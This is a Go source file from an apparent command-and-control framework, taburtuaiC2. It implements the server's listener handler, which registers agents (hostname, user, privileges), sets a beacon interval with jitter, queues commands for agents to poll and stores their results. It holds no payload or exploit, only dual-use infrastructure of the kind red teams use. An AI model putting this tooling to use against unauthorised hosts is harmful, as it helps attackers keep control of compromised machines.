package core

import (
	"encoding/json"
	"fmt"

	"github.com/mjopsec/taburtuaiC2/listener"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// ListenerHandler adapts *Server to the listener.Handler interface so that
// the WS (and HTTP) listener packages can delegate to existing business logic
// without importing the api package.
type ListenerHandler struct {
	s *Server
}

// NewListenerHandler wraps a Server as a listener.Handler.
func NewListenerHandler(s *Server) listener.Handler {
	return &ListenerHandler{s: s}
}

// OnCheckin registers or refreshes an agent and returns a config ack.
func (h *ListenerHandler) OnCheckin(data *listener.CheckinData) (interface{}, error) {
	m := map[string]any{
		"id":           data.AgentID,
		"hostname":     data.Hostname,
		"username":     data.Username,
		"os":           data.OS,
		"architecture": data.Arch,
		"process_id":   data.PID,
		"privileges":   data.Privs,
	}
	for k, v := range data.Metadata {
		m[k] = v
	}

	if err := h.s.Monitor.RegisterAgent(m); err != nil {
		return nil, fmt.Errorf("register agent: %w", err)
	}

	return map[string]any{
		"status": "ok",
		"config": map[string]any{"interval": 30, "jitter": 0.3},
	}, nil
}

// OnPoll returns the next pending command for agentID, or nil when the queue is empty.
func (h *ListenerHandler) OnPoll(agentID string) (interface{}, error) {
	cmd := h.s.CommandQueue.GetNext(agentID)
	if cmd == nil {
		return nil, nil
	}
	return cmd, nil
}

// OnResult processes a raw result payload submitted by an agent.
func (h *ListenerHandler) OnResult(agentID string, payload []byte) error {
	// payload may be a JSON-encoded byte-slice (i.e. a JSON string containing JSON)
	// or a raw JSON object — try unwrapping one layer first.
	unwrapped := payload
	var inner []byte
	if err := json.Unmarshal(payload, &inner); err == nil && len(inner) > 0 {
		unwrapped = inner
	}

	var result types.CommandResult
	if err := json.Unmarshal(unwrapped, &result); err != nil {
		return fmt.Errorf("unmarshal result: %w", err)
	}
	if result.CommandID == "" {
		return fmt.Errorf("result missing command_id")
	}

	_, err := h.s.CommandQueue.CompleteCommand(result.CommandID, &result)
	return err
}
